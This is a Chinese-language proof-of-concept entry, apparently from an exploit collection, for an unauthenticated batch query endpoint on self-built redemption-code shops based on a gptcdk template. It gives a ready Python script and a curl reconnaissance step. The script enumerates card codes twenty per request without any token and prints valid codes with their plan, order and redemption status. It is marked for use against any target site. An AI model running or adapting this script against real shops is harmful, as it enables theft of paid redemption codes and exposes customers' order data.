# 自研卡密兑换站未授权批量查询接口 /api/v1/cdk/batch（20 张/请求，响应含套餐/订单）

- **code**: 自研卡密兑换站未授权批量查询接口-api-v1-cdk-batch-20-张-请求-响应含套餐-订单
- **kind**: poc
- **category**: unauthorized
- **component**: 自研卡密兑换站（gptcdk 同源模板）
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com（203.0.113.105）实测：POST /api/v1/cdk/batch {"codes":[20 项]} → HTTP 200 {"ok":true,"total":20,"max":20,"results":[...]}；25 项 → 400 invalid_count；无任何 Cookie/Token。同站单卡接口 POST /api/v1/cdk/lookup {"code":"TEST1234"} → 200 返回完整卡密对象。
- **path**: pocs/自研卡密兑换站未授权批量查询接口-api-v1-cdk-batch-20-张-请求-响应含套餐-订单/cdk_batch_unauth.py
- **tags**: unauthorized,卡密,批量查询,gptcdk,接口枚举
- **created_at**: 2026-09-28T07:08:38.399Z
- **found_by**: exploit

## 描述

自研卡密兑换站（gptcdk 同源模板）常见的一个未授权批量查询接口面：单卡 /api/v1/cdk/lookup 与批量 /api/v1/cdk/batch 同源且都无鉴权，批量接口服务端自报 max（上限 20），可把在线卡密枚举速率放大 20 倍；响应回吐完整卡密对象（status/plan/plan_key/can_redeem/order）。

## 用法

```
把 BASE/HOST 换成目标站；先 `curl -sk https://<host>/app.js -o app.js && grep -n 'codes\|/batch' app.js` 确认批量接口与参数名，再运行脚本。批量接口上限由响应里的 "max" 字段给出（实测 20）。
```

## 正文

```
"""未授权批量卡密查询（自研卡密站通用手法）
1) 先抓前端 app.js，从里面找批量查询逻辑（如 lookupApi({codes: chunk}, "/batch")）
2) 按提示的参数名构造批量请求；参数名错了会返回 invalid_count
3) 服务端响应里会自报 max（上限），照着 max 组织批次最快
"""
import json, requests
requests.packages.urllib3.disable_warnings()

BASE = "https://example.com"   # 换成目标
HOST = "example.com"
H = {"User-Agent": "Mozilla/5.0 Chrome/124", "Content-Type": "application/json", "Host": HOST}

def batch(codes):
    r = requests.post(BASE + "/api/v1/cdk/batch", headers=H, data=json.dumps({"codes": codes}),
                      timeout=30, verify=False)
    d = r.json()
    assert d.get("ok"), d
    return d

d = batch(["TEST1234", "TEST1235"])
print("total=%s max=%s" % (d["total"], d["max"]))      # -> total=2 max=20
for x in d["results"]:
    if x["status"] != "not_found":                     # 命中真实卡密：含 plan/order/can_redeem
        print(json.dumps(x, ensure_ascii=False))

# 单卡接口（同样无鉴权）
r = requests.post(BASE + "/api/v1/cdk/lookup", headers=H, data=json.dumps({"code": "TEST1234"}), timeout=30, verify=False)
print(r.text[:300])

```
